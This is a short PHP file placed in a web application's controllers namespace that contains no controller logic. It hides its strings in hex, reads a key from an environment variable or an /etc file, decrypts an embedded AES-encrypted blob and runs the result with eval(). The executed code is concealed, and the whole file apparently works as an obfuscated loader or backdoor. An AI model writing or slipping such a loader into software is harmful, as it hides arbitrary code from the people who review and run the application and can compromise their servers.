<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+gENmaRwsXjn+5v6+ai45w==');

$c=base64_decode(

'HmkYMGbpaNWDi81mbhop8K198nZVj9PtoClubWNFEf8MxfyXxfLWsfZrTBmNnMADR1tBZ/U7zxdU' .
'+UZ4PSKLBVFcVMs4731SDeL7k0diXxJ1hkQqExRSUQu3lTEdkHXvBa2r0ufSf2/MizVroqCQNqVH' .
'Irkitk+N/UG3iXXMgzhrn4reo76/nWwUTHPcMLExnV5E0c255jNNsKdN6rOeD3wQgRBR4JrHDRuR' .
'cSQTUhCkOs2ztwmAsLLAP9ZNYa86'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

